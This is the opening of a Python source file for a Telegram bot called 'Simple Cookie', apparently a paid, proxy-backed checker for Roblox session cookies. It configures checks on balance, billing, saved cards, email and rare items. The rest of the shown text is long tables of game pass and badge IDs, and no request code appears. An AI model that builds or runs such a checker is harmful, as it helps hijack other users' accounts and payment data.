import os
import json
import logging
import random
import threading
import requests
import json
import shutil
from datetime import datetime
import asyncio
import aiohttp
import zipfile
import queue
import time
from datetime import date, datetime, timedelta
from collections import defaultdict
from pytz import timezone
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, FSInputFile, InputMediaDocument,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
    LabeledPrice
)
from aiogram.enums import ParseMode
import telebot


ADMINS = [] #admins
BOT_TOKEN = ''#token from @BotFather
BOT_NAME = 'sɪᴍᴘʟᴇ ᴄᴏᴏᴋɪᴇ' #bot name
CRYPTOBOT_API_KEY = '' #cryptobot api key
DISCORD_WEBHOOK_URL = "" #discord webhook url
DATABASE_DIR = 'Users/'
COOKIE_FILES_DIR = 'filesforcookie/'
PROXIES_FILE = 'proxies.txt'
TARGET_ITEMS = [
    131592085,
    139610147,
    10159600649,
    494291269,
    10159610478,
    1365767
]
MAX_RETRIES = 5
CONCURRENT_CHECKS = 50
REQUEST_TIMEOUT = 10

RARE_ITEMS_NAMES = {
    131592085: "Headless Horseman",
    139610147: "Korblox Deathspeaker",
    10159600649: "8-Bit Royal Crown",
    494291269: "Super Super Happy Face",
    10159610478: "8-Bit HP Bar",
    1365767: "Valkyrie Helm"
}

STICKERS = {
    'welcome': 'CAACAgIAAxkBAAELKE5pc9U8sjR8JgnWLYz3SUVJtw-bSgACzB0AAkv0GEnDS_j9cHFrTDgE',
    'check_start': 'CAACAgIAAxkBAAELGpJpcnxPGWvgB1-I0Xfhob5Yo6DGQwACvSAAAp3IGEmkc8ryWmFvUDgE',
    'check_progress': 'CAACAgIAAxkBAAELGphpcnxq59CBlFr3qHn74o7kVXKXpQACeyAAAkJTGEnBL92hgeISODgE',
    'success': 'CAACAgIAAxkBAAELGqJpcnyeWavca6OnhcXWTstEUY6FQgACkCAAAt20GEkhH6brybtfDjgE',
    'error': 'CAACAgIAAxkBAAELGp5pcnx7KdySrB8MtzZCmel8zk3mPAACSx0AAq6bGEnw-aaWs-8uujgE',
    'profile': 'CAACAgIAAxkBAAELGqlpcnzO4Bp5MxtYUUDynLPFbGe7VgACCxwAAoLVGEkVV69hHSif1jgE',
    'ban': 'CAACAgIAAxkBAAELKCdpc9HX1V7Otw9rGgKAFpstwoKUxgACqBUAAqjwUEm6qqtgetNT7TgE'
}

DEFAULT_CHECK_PARAMS = {
    'balance': True,
    'pending': True,
    'badges_by_name': True,
    'gamepasses_by_name': True,
    'donate_year': True,
    'donate_all_time': False,
    'ingame_donate': True,
    'playtime': True,
    'rap': True,
    'billing': True,
    'cards': True,
    'premium': True,
    'email': True,
    'rare_items': True,
    'badges': True,
    'gamepasses': True,
    'group_balance': True,
    'place_visits': True,
    'country': True
}

DEFAULT_OUTPUT_FORMAT = {
    'zip': True,
    'txt': False
}

DEFAULT_GAME_SETTINGS = {
    'Steal a Brainrot': {'enabled': True, 'game_id': 109983668079237},
    'Grow a Garden': {'enabled': True, 'game_id': 111530421351096},
    'Adopt Me': {'enabled': True, 'game_id': 920587237},
    'Blade Ball': {'enabled': True, 'game_id': 13772394625},
    'PS99': {'enabled': True, 'game_id': 8737899170},
    'MM2': {'enabled': True, 'game_id': 142823291},
    'BSS': {'enabled': True, 'game_id': 1537690962},
    'Jailbreak': {'enabled': True, 'game_id': 606849621},
    'Blox Fruits': {'enabled': True, 'game_id': 2753915549}
}

DEFAULT_PLAYTIME_SETTINGS = {
    'Steal a Brainrot': True,
    'Grow a Garden': True,
    'Adopt Me': True,
    'Blade Ball': True,
    'PS99': True,
    'MM2': True,
    'BSS': True,
    'Jailbreak': True,
    'Blox Fruits': True
}


# Thanks to h1kken for providing gamepass and badge data!
# Source: https://github.com/h1kken/MeowTool

class NinetyNineNightsintheForest: # https://www.roblox.com/games/79546208627805
    placeNames = '99 Nights in the Forest', '99_Nights_in_the_Forest', '99NITF', 79546208627805
    class Gamepasses:
        MedicClass  = 'Medic Class',  1236071562, 'Medic_Class'
        RangerClass = 'Ranger Class', 1235909977, 'Ranger_Class'
        # List Of Gamepasses
        listOfGamepasses = [MedicClass, RangerClass]
    class Badges:
        Survive10days      = 'Survive 10 days',      2310366779580636, 'Survive_10_days'
        Survive20days      = 'Survive 20 days',      2491852490394472, 'Survive_20_days'
        Survive30days      = 'Survive 30 days',      2419608566642291, 'Survive_30_days'
        Survive40days      = 'Survive 40 days',      554308544894889,  'Survive_40_days'
        Survive50days      = 'Survive 50 days',      3412064596604231, 'Survive_50_days'
        Survive60days      = 'Survive 60 days',      1737414705437281, 'Survive_60_days'
        Survive70days      = 'Survive 70 days',      4033173523231173, 'Survive_70_days'
        Survive80days      = 'Survive 80 days',      2567683149214007, 'Survive_80_days'
        Survive90days      = 'Survive 90 days',      4230596623100073, 'Survive_90_days'
        Survive100days     = 'Survive 100 days',     3189171443259717, 'Survive_100_days'
        Combat             = 'Combat',               3019204750024378, 'Combat'
        Gardening          = 'Gardening',            1806706511193732, 'Gardening'
        FiremakingI        = 'Firemaking I',         2438152097371936, 'Firemaking_I'
        FiremakingII       = 'Firemaking II',        2005749031618947, 'Firemaking_II'
        FirstAid           = 'First Aid',            2001789220731988, 'First_Aid'
        Taming             = 'Taming',               3377143203517885, 'Taming'
        Crafting           = 'Crafting',             2027865090521852, 'Crafting'
        FiremakingIII      = 'Firemaking III',       3677382718476753, 'Firemaking_III'
        Beastmaster        = 'Beastmaster',          1339575633400553, 'Beastmaster'
        Usurpation         = 'Usurpation',           387000908551525,  'Usurpation'
        Husbandry          = 'Husbandry',            1674875257275150, 'Husbandry'
        Infiltration       = 'Infiltration',         4351793822740062, 'Infiltration'
        Hunting            = 'Hunting',              1551739613632860, 'Hunting'
        FiremakingIV       = 'Firemaking IV',        749743730964646,  'Firemaking_IV'
        Orienteering       = 'Orienteering',         3309153759455296, 'Orienteering'
        Teamwork           = 'Teamwork',             3168356882259569, 'Teamwork'
        SelfPreservation   = 'Self-Preservation',    334197250508484,  'Self_Preservation'
        Vegetarian         = 'Vegetarian',           416205278974903,  'Vegetarian'
        Swiftness          = 'Swiftness',            2405041291915669, 'Swiftness'
        Durability         = 'Durability',           3775784138528895, 'Durability'
        Humiliation        = 'Humiliation',          1578027557968563, 'Humiliation'
        DeterminedI        = 'Determined I',         2410517601139369, 'Determined_I'
        DeterminedII       = 'Determined II',        4316839073409710, 'Determined_II'
        HalloweenRuneToken = 'Halloween Rune Token', 517976950795023,  'Halloween_Rune_Token'
        HalloweenKeyToken  = 'Halloween Key Token',  2790425224066975, 'Halloween_Key_Token'
        # List Of Badges
        listOfBadges = [Survive10days, Survive20days, Survive30days, Survive40days, Survive50days, Survive60days, Survive70days, Survive80days, Survive90days, Survive100days, Combat, Gardening, FiremakingI, FiremakingII, FirstAid, Taming, Crafting, FiremakingIII, Beastmaster, Usurpation, Husbandry, Infiltration, Hunting, FiremakingIV, Orienteering, Teamwork, SelfPreservation, Vegetarian, Swiftness, Durability, Humiliation, DeterminedI, DeterminedII, HalloweenRuneToken, HalloweenKeyToken]

class AUniversalTime: # https://www.roblox.com/games/5130598377
    placeNames = 'A Universal Time', 'A_Universal_Time', 'AUT', 5130598377
    class Gamepasses:
        CoolCustomStand        = 'Cool Custom Stand',       9985664,   'Cool_Custom_Stand'
        Plus3StandStorageSlots = '3+ Stand Storage Slots',  10397197,  '3_Plus_Stand_Storage_Slots'
        Plus3BankSlots         = '3+ Bank Slots',           10478668,  '3_Plus_Bank_Slots'
        Plus3BankSlotsStorage  = '3+ Bank Slots Storage',   10479192,  '3_Plus_Bank_Slots_Storage'
        ItemNotifier           = 'Item Notifier',           10562035,  'Item_Notifier'
        Donation               = 'Donation',                10753254,  'Donation'
        SmallDonation          = 'Small Donation',          10304426,  'Small_Donation'
        MediumDonation         = 'Medium Donation',         10096532,  'Medium_Donation'
        KursDonation           = 'kur\'s Donation',         10507934,  'Kurs_Donation'
        HydrasDonationPerks    = 'Hydra\'s Donation Perks', 10516158,  'Hydras_Donation_Perks'
        Tips                   = 'Tips',                    10381097,  'Tips'
        CustomChatColor        = 'Custom Chat Color',       11491183,  'Custom_Chat_Color'
        ChatBackgroundColor    = 'Chat Background Color',   11581293,  'Chat_Background_Color'
        EmotesPackv1           = 'Emotes Pack v1',          13675608,  'Emotes_Pack_v1'
        EmotePackv2            = 'Emote Pack v2',           14014491,  'Emote_Pack_v2'
        EmotePackv3            = 'Emote Pack v3',           822694616, 'Emote_Pack_v3'
        EmotePackv4            = 'Emote Pack v4',           822666635, 'Emote_Pack_v4'
        EmotePackv5            = 'Emote Pack v5',           837754540, 'Emote_Pack_v5'
        JJKEmotePack           = 'JJK Emote Pack',          920471052, 'JJK_Emote_Pack'
        SmartAssistant         = 'Smart Assistant',         939773206, 'Smart_Assistant'
        CommunityEmotePack     = 'Community Emote Pack',    948648926, 'Community_Emote_Pack'
        # List Of Gamepasses
        listOfGamepasses = [CoolCustomStand, Plus3StandStorageSlots, Plus3BankSlots, Plus3BankSlotsStorage, ItemNotifier, Donation, SmallDonation, MediumDonation, KursDonation, HydrasDonationPerks, Tips, CustomChatColor, ChatBackgroundColor, EmotesPackv1, EmotePackv2, EmotePackv3, EmotePackv4, EmotePackv5, JJKEmotePack, SmartAssistant, CommunityEmotePack]
    class Badges:
        AUTWinterXMas     = 'AUT Winter/X-Mas',    2124647551,       'AUT_Winter_XMas'
        NewUniverse       = 'New Universe',        2124749486,       'New_Universe'
        AHauntingTime     = 'A Haunting Time',     3072215579952874, 'A_Haunting_Time'
        AJollyTime        = 'A Jolly Time',        500904421623568,  'A_Jolly_Time'
        Labs              = 'Labs',                1971538031465661, 'Labs'
        Space             = 'Space',               473276580157634,  'Space'
        ForTheDelta       = 'δ: FOR THE DELTA',    314819738905580,  'For_The_Delta'
        MaxReputationRank = 'Max Reputation Rank', 1349907244987521, 'Max_Reputation_Rank'
        # List Of Badges
        listOfBadges = [AUTWinterXMas, NewUniverse, AHauntingTime, AJollyTime, Labs, Space, ForTheDelta, MaxReputationRank]

class AdoptMe: # https://www.roblox.com/games/920587237
    placeNames = 'Adopt Me', 'Adopt_Me', 'AM', 920587237
    class Gamepasses:
        VIP                     = 'VIP',                        3196348,   'VIP'
        Glider                  = 'Glider',                     3745845,   'Glider'
        StarterPack             = 'Starter Pack',               4785795,   'Starter_Pack'
        DJ                      = 'DJ',                         4796463,   'DJ'
        CandyCannon             = 'Candy Cannon',               5246776,   'Candy_Cannon'
        PremiumPlots            = 'Premium Plots',              5300198,   'Premium_Plots'
        PremiumFaces            = 'Premium Faces',              5704158,   'Premium_Faces'
        SupercarPack            = 'Supercar Pack',              5785139,   'Supercar_Pack'
        HeartHoverboard         = 'Heart Hoverboard',           5885873,   'Heart_Hoverboard'
        RoyalCarriages          = 'Royal Carriages',            5904007,   'Royal_Carriages'
        MillionairePack         = 'Millionaire Pack',           6040696,   'Millionaire_Pack'
        MermaidMansion          = 'Mermaid Mansion',            6164327,   'Mermaid_Mansion'
        CelebrityMansion        = 'Celebrity Mansion',          6408694,   'Celebrity_Mansion'
        PetHorse                = 'Pet Horse',                  6558811,   'Pet_Horse'
        PetGriffin              = 'Pet Griffin',                6558813,   'Pet_Griffin'
        LemonadeStand           = 'Lemonade Stand',             6858591,   'Lemonade_Stand'
        HotdogStand             = 'Hotdog Stand',               7124470,   'Hotdog_Stand'
        ModernMansion           = 'Modern Mansion',             6965379,   'Modern_Mansion'
        CozyHomeLure            = 'Cozy Home Lure',             189425850, 'Cozy_Home_Lure'
        SchoolandHospitalHomes  = 'School and Hospital Homes',  951065968, 'Schooland_Hospital_Homes'
        SoccerStadium           = 'Soccer Stadium',             951395729, 'Soccer_Stadium'
        FossilIsleReturnsBundle = 'Fossil Isle Returns Bundle', 951441773, 'Fossil_Isle_Returns_Bundle'
        # List Of Gamepasses
        listOfGamepasses = [VIP, Glider, StarterPack, DJ, CandyCannon, PremiumPlots, PremiumFaces, SupercarPack, HeartHoverboard, RoyalCarriages, MillionairePack, MermaidMansion, CelebrityMansion, PetHorse, PetGriffin, LemonadeStand, HotdogStand, ModernMansion, CozyHomeLure, SchoolandHospitalHomes, SoccerStadium, FossilIsleReturnsBundle]
    class Badges:
        TinyIsles                   = 'Tiny Isles',                            2124439922,       'Tiny_Isles'
        AncientRuins                = 'Ancient Ruins',                         2124439923,       'Ancient_Ruins'
        CoastalClimb                = 'Coastal Climb',                         2124439924,       'Coastal_Climb'
        LonelyPeak                  = 'Lonely Peak',                           2124439925,       'Lonely_Peak'
        Miniworld                   = 'Miniworld',                             2124439926,       'Miniworld'
        Pyramid                     = 'Pyramid',                               2124439927,       'Pyramid'
        ShipwreckBay                = 'Shipwreck Bay',                         2124439928,       'Shipwreck_Bay'
        RobloxEggHunt2020           = 'Roblox Egg Hunt 2020',                  2124520917,       'Roblox_Egg_Hunt_2020'
        RBBattlesChallenge          = 'RB Battles Challenge',                  2129488028,       'RB_Battles_Challenge'
        Unnamed                     = '???',                                   2129488030,       'Unnamed'
        Garden                      = 'Garden',                                135520552767917,  'Garden'
        RobloxTheGamesAdoptMeQuest1 = 'Roblox The Games: Adopt Me! - Quest 1', 1048893619880427, 'Roblox_The_Games_Adopt_Me_Quest_1'
        RobloxTheGamesAdoptMeQuest2 = 'Roblox The Games: Adopt Me! - Quest 2', 763171671267524,  'Roblox_The_Games_Adopt_Me_Quest_2'
        RobloxTheGamesAdoptMeQuest3 = 'Roblox The Games: Adopt Me! - Quest 3', 925260774262149,  'Roblox_The_Games_Adopt_Me_Quest_3'
        RobloxTheGamesAdoptMeShine1 = 'Roblox The Games: Adopt Me! - Shine 1', 89650026776535,   'Roblox_The_Games_Adopt_Me_Shine_1'
        RobloxTheGamesAdoptMeShine2 = 'Roblox The Games: Adopt Me! - Shine 2', 292596439745713,  'Roblox_The_Games_Adopt_Me_Shine_2'
        RobloxTheGamesAdoptMeShine3 = 'Roblox The Games: Adopt Me! - Shine 3', 1683279614525471, 'Roblox_The_Games_Adopt_Me_Shine_3'
        RobloxTheGamesAdoptMeShine4 = 'Roblox The Games: Adopt Me! - Shine 4', 1065569517641022, 'Roblox_The_Games_Adopt_Me_Shine_4'
        RobloxTheGamesAdoptMeShine5 = 'Roblox The Games: Adopt Me! - Shine 5', 3865916040798951, 'Roblox_The_Games_Adopt_Me_Shine_5'
        HunterBadge                 = 'Hunter Badge',                          160677344563654,  'Hunter_Badge'
        WhereBearBadge              = 'Where Bear? Badge',                     211728180632535,  'Where_Bear_Badge'
        SurvivorBadge               = 'Survivor Badge',                        639601989428398,  'Survivor_Badge'
        Testing                     = 'Testing',                               2388128713374485, 'Testing'
        HalloweenSpotlightRune      = 'Halloween Spotlight Rune',              2876404161740375, 'Halloween_Spotlight_Rune'
        HalloweenSpotlightKey       = 'Halloween Spotlight Key',               2865954472113762, 'Halloween_Spotlight_Key'
        # List Of Badges
        listOfBadges = [TinyIsles, AncientRuins, CoastalClimb, LonelyPeak, Miniworld, Pyramid, ShipwreckBay, RobloxEggHunt2020, RBBattlesChallenge, Unnamed, Garden, RobloxTheGamesAdoptMeQuest1, RobloxTheGamesAdoptMeQuest2, RobloxTheGamesAdoptMeQuest3, RobloxTheGamesAdoptMeShine1, RobloxTheGamesAdoptMeShine2, RobloxTheGamesAdoptMeShine3, RobloxTheGamesAdoptMeShine4, RobloxTheGamesAdoptMeShine5, HunterBadge, WhereBearBadge, SurvivorBadge, Testing, HalloweenSpotlightRune, HalloweenSpotlightKey]

class AnimeAdventures: # https://www.roblox.com/games/8304191830
    placeNames = 'Anime Adventures', 'Anime_Adventures', 'AA', 8304191830
    class Gamepasses:
        VIP             = 'VIP',               55372677, 'VIP'
        ShinyHunter     = 'Shiny Hunter',      55373046, 'Shiny_Hunter'
        UnitStorage     = 'Unit Storage',      55373124, 'Unit_Storage'
        Display3Units   = 'Display 3 Units',   55373224, 'Display_3_Units'
        DisplayAllUnits = 'Display All Units', 99127218, 'Display_All_Units'
        # List Of Gamepasses
        listOfGamepasses = [VIP, ShinyHunter, UnitStorage, Display3Units, DisplayAllUnits]
    class Badges:
        TheHatch2025 = 'The Hatch 2025', 4244887231710040, 'The_Hatch_2025'
        # List Of Badges
        listOfBadges = [TheHatch2025]

class AnimeDefenders: # https://www.roblox.com/games/17017769292
    placeNames = 'Anime Defenders', 'Anime_Defenders', 'AD', 17017769292
    class Gamepasses:
        VIP                    = 'VIP',                      812679198,  'VIP'
        ShinyHunter            = 'Shiny Hunter',             812891077,  'Shiny_Hunter'
        MoreBoothSpace         = 'More Booth Space',         812985318,  'More_Booth_Space'
        x3Speed                = '3x Speed',                 903541948,  '3x_Speed'
        x50Unboxing            = '50x Unboxing',             903895415,  '50x_Unboxing'
        DivineDragonBattlepass = 'Divine Dragon Battlepass', 857122763,  'Divine_Dragon_Battlepass'
        AthenyxsBattlepass     = 'Athenyx\'s Battlepass',    895533720,  'Athenyxs_Battlepass'
        ChristmasBattlepass    = 'Christmas Battlepass',     1004747738, 'Christmas_Battlepass'
        # List Of Gamepasses
        listOfGamepasses = [VIP, ShinyHunter, MoreBoothSpace, x3Speed, x50Unboxing, DivineDragonBattlepass, AthenyxsBattlepass, ChristmasBattlepass]

class AnimeVanguards: # https://www.roblox.com/games/16146832113
    placeNames = 'Anime Vanguards', 'Anime_Vanguards', 'AV', 16146832113
    class Gamepasses:
        AnimeVanguardsTester = 'Anime Vanguards Tester', 780911708, 'Anime_Vanguards_Tester'
        ExtraUnitStorage     = 'Extra Unit Storage',     842367966, 'Extra_Unit_Storage'
        VIP                  = 'VIP',                    843295206, 'VIP'
        ShinyHunter          = 'Shiny Hunter',           846032291, 'Shiny_Hunter'
        DisplayAllUnits      = 'Display All Units',      846695813, 'Display_All_Units'
        # List Of Gamepasses
        listOfGamepasses = [AnimeVanguardsTester, ExtraUnitStorage, VIP, ShinyHunter, DisplayAllUnits]
    class Badges:
        MetTheOwner   = 'Met the Owner',   878251529804666,  'Met_the_Owner'
        MetADeveloper = 'Met a Developer', 4435567743462309, 'Met_a_Developer'
        # List Of Badges
        listOfBadges = [MetTheOwner, MetADeveloper]

class BedWars: # https://www.roblox.com/games/6872265039
    placeNames = 'BedWars', 'BedWars', 'BW', 6872265039
    class Gamepasses:
        VIPRank                = 'VIP Rank',                   18301866,   'VIP_Rank'
        BPSeason1              = 'BP Season 1',                21693382,   'BP_Season_1'
        BPSeason2              = 'BP Season 2',                24095899,   'BP_Season_2'
        BPSeason3              = 'BP Season 3',                26144939,   'BP_Season_3'
        BPSeason4              = 'BP Season 4',                35261547,   'BP_Season_4'
        BPSeason5              = 'BP Season 5',                50948602,   'BP_Season_5'
        BPSeason6              = 'BP Season 6',                87558788,   'BP_Season_6'
        BPSeason7              = 'BP Season 7',                137859107,  'BP_Season_7'
        BPSeason8              = 'BP Season 8',                194467229,  'BP_Season_8'
        BPSeason9              = 'BP Season 9',                655966705,  'BP_Season_9'
        BPSeason10             = 'BP Season 10',               773957870,  'BP_Season_10'
        BPSeason11             = 'BP Season 11',               894182315,  'BP_Season_11'
        BPSeason12             = 'BP Season 12',               1004797371, 'BP_Season_12'
        BPSeason13             = 'BP Season 13',               1164146553, 'BP_Season_13'
        HolidayBundle2021      = 'Holiday Bundle 2021',        26343736,   'Holiday_Bundle_2021'
        HolidayBundle2022      = 'Holiday Bundle 2022',        113770382,  'Holiday_Bundle_2022'
        HolidayBundle2023      = 'Holiday Bundle 2023',        675791713,  'Holiday_Bundle_2023'
        HolidayBundle2024      = 'Holiday Bundle 2024',        1009510880, 'Holiday_Bundle_2024'
        LunarNewYearBundle2022 = 'Lunar New Year Bundle 2022', 27969090,   'Lunar_New_Year_Bundle_2022'
        LunarBundle2024        = 'Lunar Bundle 2024',          701489596,  'Lunar_Bundle_2024'
        NewsYearsBundle2024    = 'News Years Bundle 2024',     678316034,  'News_Years_Bundle_2024'
        LumenEmberKitBundle    = 'Lumen & Ember Kit Bundle',   44594629,   'Lumen_And_Ember_Kit_Bundle'
        EmberLumenKitBundle    = 'Ember & Lumen Kit Bundle',   47400080,   'Ember_And_Lumen_Kit_Bundle'
        MinerBundle            = 'Miner Bundle',               29973548,   'Miner_Bundle'
        EvelynnBundle          = 'Evelynn Bundle',             67052293,   'Evelynn_Bundle'
        HannahBundle           = 'Hannah Bundle',              78679462,   'Hannah_Bundle'
        MarinaBundle           = 'Marina Bundle',              839951205,  'Marina_Bundle'
        TrixieBundle           = 'Trixie Bundle',              1083085937, 'Trixie_Bundle'
        CyberKit               = 'Cyber Kit',                  42490369,   'Cyber_Kit'
        MarinaKit              = 'Marina Kit',                 850765902,  'Marina_Kit'
        SilasKit               = 'Silas Kit',                  893892894,  'Silas_Kit'
        WrenKit                = 'Wren Kit',                   893911891,  'Wren_Kit'
        NazarKit               = 'Nazar Kit',                  893913917,  'Nazar_Kit'
        KaidaKit               = 'Kaida Kit',                  893937811,  'Kaida_Kit'
        DeathAdderKit          = 'Death Adder Kit',            893960773,  'Death_Adder_Kit'
        ArachneKit             = 'Arachne Kit',                952119163,  'Arachne_Kit'
        NyokaKit               = 'Nyoka Kit',                  1002745620, 'Nyoka_Kit'
        AgniKit                = 'Agni Kit',                   1003015617, 'Agni_Kit'
        VoidKnightKit          = 'Void Knight Kit',            1003723662, 'Void_Knight_Kit'
        GroveKit               = 'Grove Kit',                  1003729549, 'Grove_Kit'
        HephaestusKit          = 'Hephaestus Kit',             1003867591, 'Hephaestus_Kit'
        BekzatKit              = 'Bekzat Kit',                 1004227635, 'Bekzat_Kit'
        StyxKit                = 'Styx Kit',                   1004335582, 'Styx_Kit'
        UmaKit                 = 'Uma Kit',                    1004557543, 'Uma_Kit'
        SkollKit               = 'Skoll Kit',                  1027096064, 'Skoll_Kit'
        TrixieKit              = 'Trixie Kit',                 1105395958, 'Trixie_Kit'
        FarmerCletus           = 'Farmer Cletus',              18876495,   'Farmer_Cletus'
        Baker                  = 'Baker',                      19086951,   'Baker'
        Builder                = 'Builder',                    19088340,   'Builder'
        Archer                 = 'Archer',                     19275795,   'Archer'
        InfernalShielder       = 'Infernal Shielder',          19546564,   'Infernal_Shielder'
        Barbarian              = 'Barbarian',                  19551065,   'Barbarian'
        Melody                 = 'Melody',                     19722364,   'Melody'
        PirateDavey            = 'Pirate Davey',               20030035,   'Pirate_Davey'
        Eldertree              = 'Eldertree',                  20245233,   'Eldertree'
        Lassy                  = 'Lassy',                      20645574,   'Lassy'
        GrimReaper             = 'Grim Reaper',                20872871,   'Grim_Reaper'
        Wizard                 = 'Wizard',                     21261740,   'Wizard'
        Vulcan                 = 'Vulcan',                     21421966,   'Vulcan'
        AxolotlAmy             = 'Axolotl Amy',                24393543,   'Axolotl_Amy'
        Vanessa                = 'Vanessa',                    24913310,   'Vanessa'
        Freiya                 = 'Freiya',                     25647124,   'Freiya'
        Yuzi                   = 'Yuzi',                       28594502,   'Yuzi'
        ClanPass               = 'Clan Pass',                  32610830,   'Clan_Pass'
        Miner                  = 'Miner',                      33821514,   'Miner'
        Evelynn                = 'Evelynn',                    72590411,   'Evelynn'
        Hannah                 = 'Hannah',                     83730490,   'Hannah'
        Crypt                  = 'Crypt',                      97149830,   'Crypt'
        Zenith                 = 'Zenith',                     104797973,  'Zenith'
        Adetunde               = 'Adetunde',                   111620008,  'Adetunde'
        Lyla                   = 'Lyla',                       169772861,  'Lyla'
        Milo                   = 'Milo',                       255781462,  'Milo'
        Eldric                 = 'Eldric',                     641095710,  'Eldric'
        Lian                   = 'Lian',                       719110861,  'Lian'
        Triton                 = 'Triton',                     845519348,  'Triton'
        # List Of Gamepasses
        listOfGamepasses = [VIPRank, BPSeason1, BPSeason2, BPSeason3, BPSeason4, BPSeason5, BPSeason6, BPSeason7, BPSeason8, BPSeason9, BPSeason10, BPSeason11, BPSeason12, BPSeason13, HolidayBundle2021, HolidayBundle2022, HolidayBundle2023, HolidayBundle2024, LunarNewYearBundle2022, LunarBundle2024, NewsYearsBundle2024, LumenEmberKitBundle, EmberLumenKitBundle, MinerBundle, EvelynnBundle, HannahBundle, MarinaBundle, TrixieBundle, CyberKit, MarinaKit, SilasKit, WrenKit, NazarKit, KaidaKit, DeathAdderKit, ArachneKit, NyokaKit, AgniKit, VoidKnightKit, GroveKit, HephaestusKit, BekzatKit, StyxKit, UmaKit, SkollKit, TrixieKit, FarmerCletus, Baker, Builder, Archer, InfernalShielder, Barbarian, Melody, PirateDavey, Eldertree, Lassy, GrimReaper, Wizard, Vulcan, AxolotlAmy, Vanessa, Freiya, Yuzi, ClanPass, Miner, Evelynn, Hannah, Crypt, Zenith, Adetunde, Lyla, Milo, Eldric, Lian, Triton]
    class Badges:
        BeVictoriousonMinigameMountain = 'Be Victorious on Minigame Mountain', 2129916158,       'Be_Victorious_on_Minigame_Mountain'
        Champion                       = 'Champion',                           2146951156,       'Champion'
        NewYears2025                   = 'New Year\'s 2025',                   64120254673374,   'New_Years_2025'
        TheHuntBedWars                 = 'The Hunt - BedWars',                 661345209724224,  'The_Hunt_BedWars'
        EggHunt2025                    = 'Egg Hunt 2025',                      731758855100911,  'Egg_Hunt_2025'
        RobloxClassicEventToken1       = 'Roblox Classic Event - Token 1',     1229219986658067, 'Roblox_Classic_Event_Token_1'
        RobloxClassicEventTix1         = 'Roblox Classic Event - Tix 1',       2466928501842682, 'Roblox_Classic_Event_Tix_1'
        DefeatedArachnesLair           = 'Defeated Arachne\'s Lair',           2770029890136596, 'Defeated_Arachnes_Lair'
        DefeatedMarrowsMadness2025     = 'Defeated Marrow\'s Madness 2025',    3344558891408093, 'Defeated_Marrows_Madness_2025'
        # List Of Badges
        listOfBadges = [BeVictoriousonMinigameMountain, Champion, NewYears2025, TheHuntBedWars, EggHunt2025, RobloxClassicEventToken1, RobloxClassicEventTix1, DefeatedArachnesLair, DefeatedMarrowsMadness2025]

class BeeSwarmSimulator: # https://www.roblox.com/games/1537690962
    placeNames = 'Bee Swarm Simulator', 'Bee_Swarm_Simulator', 'BSS', 1537690962
    class Gamepasses:
        BearBee           = 'Bear Bee',             4257788, 'Bear_Bee'
        x2ConvertSpeed    = 'x2 Convert Speed',     4231119, 'x2_Convert_Speed'
        x2BeeGatherPollen = 'x2 Bee Gather Pollen', 4231126, 'x2_Bee_Gather_Pollen'
        x2TicketChance    = 'x2 Ticket Chance',     4492467, 'x2_Ticket_Chance'
        # List Of Gamepasses
        listOfGamepasses = [BearBee, x2ConvertSpeed, x2BeeGatherPollen, x2TicketChance]
    class Badges:
        YouPlayedBeeSwarmSimulator = 'You Played Bee Swarm Simulator!', 2124634293, 'You_Played_Bee_Swarm_Simulator'
        SwarmingEggOfTheHive       = 'Swarming Egg Of The Hive',        2124520746, 'Swarming_Egg_Of_The_Hive'
        BeesmasBeeliever           = 'Beesmas Beeliever',               2124445684, 'Beesmas_Beeliever'
        BeesmasOverachiever        = 'Beesmas Overachiever',            2124445842, 'Beesmas_Overachiever'
        EggHunt2019                = 'Egg Hunt 2019',                   2124458125, 'Egg_Hunt_2019'
        Million1Honey              = '1 Million Honey',                 1749468648, '1_Million_Honey'
        Million10Honey             = '10 Million Honey',                1749519033, '10_Million_Honey'
        Million100Honey            = '100 Million Honey',               1749523673, '100_Million_Honey'
        Billion1Honey              = '1 Billion Honey',                 1749534539, '1_Billion_Honey'
        Billion20Honey             = '20 Billion Honey',                2124426329, '20_Billion_Honey'
        Thousand500Goo             = '500 Thousand Goo',                1874484250, '500_Thousand_Goo'
        Million5Goo                = '5 Million Goo',                   1874485358, '5_Million_Goo'
        Million50Goo               = '50 Million Goo',                  1874486035, '50_Million_Goo'
        Million500Goo              = '500 Million Goo',                 1874487127, '500_Million_Goo'
        Billion10Goo               = '10 Billion Goo',                  2124426332, '10_Billion_Goo'
        Battle100Points            = '100 Battle Points',               1749564142, '100_Battle_Points'
        Thousand1BattlePoints      = '1 Thousand Battle Points',        1749566481, '1_Thousand_Battle_Points'
        Thousand10BattlePoints     = '10 Thousand Battle Points',       1749568562, '10_Thousand_Battle_Points'
        Thousand50BattlePoints     = '50 Thousand Battle Points',       1749570424, '50_Thousand_Battle_Points'
        Million1BattlePoints       = '1 Million Battle Points',         2124426330, '1_Million_Battle_Points'
        Ability2500Tokens          = '2500 Ability Tokens',             1874442964, '2500_Ability_Tokens'
        Thousand25AbilityTokens    = '25 Thousand Ability Tokens',      1874445609, '25_Thousand_AbilityTokens'
        Thousand100AbilityTokens   = '100 Thousand Ability Tokens',     1874446720, '100_Thousand_AbilityTokens'
        Million1AbilityTokens      = '1 Million Ability Tokens',        1874447816, '1_Million_Ability_Tokens'
        Million10AbilityTokens     = '10 Million Ability Tokens',       2124426331, '10_Million_Ability_Tokens'
        SunflowerCadet             = 'Sunflower Cadet',                 1749604083, 'Sunflower_Cadet'
        SunflowerHotshot           = 'Sunflower Hotshot',               1749606287, 'Sunflower_Hotshot'
        SunflowerAce               = 'Sunflower Ace',                   1749608577, 'Sunflower_Ace'
        SunflowerMaster            = 'Sunflower Master',                1749610498, 'Sunflower_Master'
        SunflowerGrandmaster       = 'Sunflower Grandmaster',           2124426333, 'Sunflower_Grandmaster'
        DandelionCadet             = 'Dandelion Cadet',                 1749628495, 'Dandelion_Cadet'
        DandelionHotshot           = 'Dandelion Hotshot',               1749630489, 'Dandelion_Hotshot'
        DandelionAce               = 'Dandelion Ace',                   1749631489, 'Dandelion_Ace'
        DandelionMaster            = 'Dandelion Master',                1749632737, 'Dandelion_Master'
        DandelionGrandmaster       = 'Dandelion Grandmaster',           2124426334, 'Dandelion_Grandmaster'
